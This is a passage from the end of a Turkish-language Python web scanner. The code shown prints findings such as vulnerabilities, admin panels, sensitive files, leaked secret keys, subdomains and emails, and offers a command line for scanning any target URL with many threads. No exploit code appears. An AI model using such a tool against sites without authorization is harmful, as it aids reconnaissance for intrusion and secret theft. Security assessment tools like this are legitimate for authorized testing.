            skor.kesinti_ekle("Güvenlik Başlıkları Eksik", 10)
        if self.teknolojiler['HTTPS/TLS'] == 'HTTP (Güvensiz)':
            skor.kesinti_ekle("HTTPS Kullanılmıyor", 25)
        
        print(f"\n{BEYAZ}ÖZET:{RESET}")
        print(f"  SİTE: {YESIL}{self.temel_url}{RESET}")
        print(f"  HOST: {YESIL}{self.host}{RESET}")
        print(f"  TOPLAM BULGU: {YESIL}{len(self.tum_bulgular)}{RESET}")
        print(f"  ZAFİYET: {YESIL}{len(self.zafiyet_listesi)}{RESET}")
        print(f"  PROTOKOL: {YESIL}{len(self.protokol_listesi)}{RESET}")
        print(f"  GİZLİ ANAHTAR: {YESIL}{len(self.gizli_bulgular)}{RESET}")
        print(f"  ALT ALAN: {YESIL}{len(self.bulgular['alt_alan'])}{RESET}")
        print(f"  LİNKLER: {YESIL}{len(self.keşfedilen_linkler)}{RESET}")
        print(f"  GÜVENLİK SKORU: {skor.seviye()} - {skor.al()}/100{RESET}")
        
        self._yaz("ZAFİYETLER", KIRMIZI, self.bulgular['zafiyet'])
        self._yaz("PROTOKOLLER", KIRMIZI, self.bulgular['protokol'])
        self._yaz("ADMIN PANELLERİ", KIRMIZI, self.bulgular['admin'])
        self._yaz("HASSAS DOSYALAR", KIRMIZI, self.bulgular['hassas'])
        self._yaz("API ENDPOINTLERİ", MAVI, self.bulgular['api'])
        self._yaz("ALT ALANLAR", MAVI, self.bulgular['alt_alan'])
        self._yaz("MİMARİ", MAVI, self.bulgular['mimari'])
        self._yaz("GİZLİ ANAHTARLAR", KIRMIZI, self.bulgular['gizli'])
        self._yaz("VİRÜS İMZALARI", KIRMIZI, self.bulgular['virus'])
        self._yaz("E-POSTALAR", MOR, self.bulgular['email'])
        self._yaz("JAVASCRIPT DOSYALARI", MAVI, self.bulgular['js'])
        
        if self.zafiyet_listesi:
            print(f"\n{KIRMIZI}DETAYLI ZAFİYET RAPORU:{RESET}")
            for i, z in enumerate(self.zafiyet_listesi, 1):
                print(f"\n  {KIRMIZI}{i}. {z['zafiyet']}{RESET}")
                print(f"     KONUM: {z['konum']}")
                print(f"     AÇIKLAMA: {z['aciklama']}")
                print(f"     HATALI KOD: {z['hatali_kod']}")
                print(f"     SALDIRI: {z['saldiri']}")
                print(f"     SEVİYE: {z['seviye']}")
        
        if self.mimari_bulgular:
            print(f"\n{MAVI}SİSTEM MİMARİSİ:{RESET}")
            for b in self.mimari_bulgular:
                print(f"  {MAVI}[{b['tip']}] {b['detay']} -> {b['konum']}{RESET}")
        
        print(f"\n{BEYAZ}TEST:{RESET}")
        basarili = len([t for t in self.testler if t['durum']])
        print(f"  TOPLAM: {len(self.testler)}")
        print(f"  BAŞARILI: {YESIL}{basarili}{RESET}")
        print(f"  HATALI: {KIRMIZI}{len(self.testler)-basarili}{RESET}")
        
        print(f"\n{YESIL}[*] TAMAMLANDI! {time.time()-baslangic:.1f}s{RESET}")
        print(f"{YESIL}[*] BULABİLDİĞİ HER ŞEY BULUNDU!{RESET}")

def main():
    import argparse
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument('-u','--url', help='Analiz edilecek URL')
    p.add_argument('--threads', type=int, default=50, help='Thread sayısı (varsayılan: 50)')
    p.add_argument('--api-osint', action='store_true', help='SINIRSIZ TARAMA - HER ŞEYİ BUL')
    p.add_argument('-h','--help', action='store_true', help='Yardım')
    args = p.parse_args()
    
    if args.help or not args.url:
        print(f"""
{SARI}KULLANIM:{RESET}
  python3 web_anys.py -u https://hedef.com --api-osint

{SARI}PARAMETRELER:{RESET}
  -u, --url          Hedef URL
  --threads          Thread sayısı (varsayılan: 50, max: 200)
  --api-osint        SINIRSIZ TARAMA - BULABİLDİĞİ HER ŞEYİ BUL
  -h, --help         Bu mesaj

{SARI}ÖRNEK:{RESET}
  python3 web_anys.py -u https://example.com --api-osint
  python3 web_anys.py -u https://example.com --threads 100 --api-osint
""")
        sys.exit(0)
    
    url = args.url
    if not url.startswith('http'):
        url = 'https://' + url
    
    a = WebAnaliz(url, args.threads, args.api_osint)
    a.calistir()

if __name__ == '__main__':
    try:
        if len(sys.argv) == 1:
            print(f"{SARI}[UYARI] python3 web_anys.py -h{RESET}")
            sys.exit(1)
        main()
    except KeyboardInterrupt:
        print(f"\n{SARI}[!] İPTAL{RESET}")
        sys.exit(0)
